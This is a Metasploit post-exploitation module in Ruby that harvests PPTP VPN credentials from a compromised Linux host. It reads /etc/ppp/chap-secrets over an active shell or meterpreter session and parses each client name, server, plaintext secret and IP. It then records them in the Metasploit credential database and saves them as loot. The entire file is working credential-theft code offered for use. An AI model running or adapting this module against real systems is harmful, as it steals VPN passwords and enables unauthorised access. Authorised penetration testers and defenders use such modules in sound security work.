##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Linux Gather PPTP VPN chap-secrets Credentials',
      'Description'   => %q{
          This module collects PPTP VPN information such as client, server, password,
        and IP from your target server's chap-secrets file.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'sinn3r'],
      'Platform'      => [ 'linux' ],
      'SessionTypes'  => [ "shell", "meterpreter" ]
    ))

    register_options(
      [
        OptString.new('FILE', [true, 'The default path for chap-secrets', '/etc/ppp/chap-secrets'])
      ])
  end


  #
  # Reads chap_secrets
  #
  def load_file(fname)
    begin
      data = cmd_exec("cat #{fname}")
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to retrieve file. #{e.message}")
      data = ''
    end

    if data =~ /^#{fname}: regular file, no read permission$/ or data =~ /Permission denied$/
      return :access_denied
    elsif data =~ /\(No such file or directory\)$/
      return :not_found
    elsif data.empty?
      return :empty
    end

    return data
  end


  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: fullname,
      post_reference_name: self.refname,
      session_id: session_db_id,
      origin_type: :session,
      private_data: opts[:password],
      private_type: :password,
      username: opts[:user]
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
    }.merge(service_data)

    create_credential_login(login_data)
  end


  #
  # Extracts client, server, secret, and IP addresses
  #
  def extract_secrets(data)
    tbl = Rex::Text::Table.new({
      'Header'  => 'PPTPd chap-secrets',
      'Indent'  => 1,
      'Columns' => ['Client', 'Server', 'Secret', 'IP']
    })

    data.each_line do |l|
      # If this line is commented out, ignore it
      next if l =~ /^[[:blank:]]*#/

      found = l.split

      # Nothing is found, skip!
      next if found.empty?

      client = (found[0] || '').strip
      server = (found[1] || '').strip
      secret = (found[2] || '').strip
      ip     = (found[3,found.length] * ", " || '').strip

      report_cred(
        ip: session.session_host,
        port: 1723, # PPTP port
        service_name: 'pptp',
        user: client,
        password: secret,

      )

      tbl << [client, server, secret, ip]
    end

    if tbl.rows.empty?
      print_status("This file has no secrets: #{datastore['FILE']}")
    else
      print_line(tbl.to_s)

      p = store_loot(
        'linux.chapsecrets.creds',
        'text/csv',
        session,
        tbl.to_csv,
        File.basename(datastore['FILE'] + ".txt")
      )
      print_good("Secrets stored in: #{p}")
    end
  end


  def run
    fname = datastore['FILE']
    f     = load_file(fname)

    case f
    when :access_denied
      print_error("No permission to read: #{fname}")
    when :not_found
      print_error("Not found: #{fname}")
    when :empty
      print_status("File is actually empty: #{fname}")
    else
      extract_secrets(f)
    end
  end
end
